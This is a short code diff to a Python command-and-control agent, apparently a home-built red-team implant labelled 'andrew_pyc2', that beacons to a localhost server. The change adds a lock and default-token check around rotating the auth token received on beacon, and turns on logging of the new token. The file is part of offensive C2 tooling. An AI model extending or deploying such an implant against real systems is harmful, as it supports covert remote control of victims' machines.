@@ -73,6 +73,8 @@ import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time
 SERVER_URL = "https://127.0.0.1:8000/"
 AGENT_TYPE = "andrew_pyc2"
 AUTH_TOKEN = "abc_123"
+AUTH_TOKEN_DEFAULT = "abc_123"
+AUTH_TOKEN_LOCK = threading.Lock()
 
 # Allow connection to the server (uses a self signed cert)
 CTX = ssl.create_default_context()
@@ -134,9 +136,11 @@ def send_message(client,endpoint,message="",oldStatus=True,newStatus=True,server
                 #print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                 response_text = response.read().decode('utf-8')
                 if "agent/beacon" in endpoint: # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
-                    if response_text != AUTH_TOKEN:
-                        AUTH_TOKEN = response_text
-                        #print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
+                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
+                        if response_text != AUTH_TOKEN:
+                            with AUTH_TOKEN_LOCK:
+                                AUTH_TOKEN = response_text
+                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                 return True, response_text
             else:
                 print_debug(f"send_message({url}): Server error: {response.getcode()}")
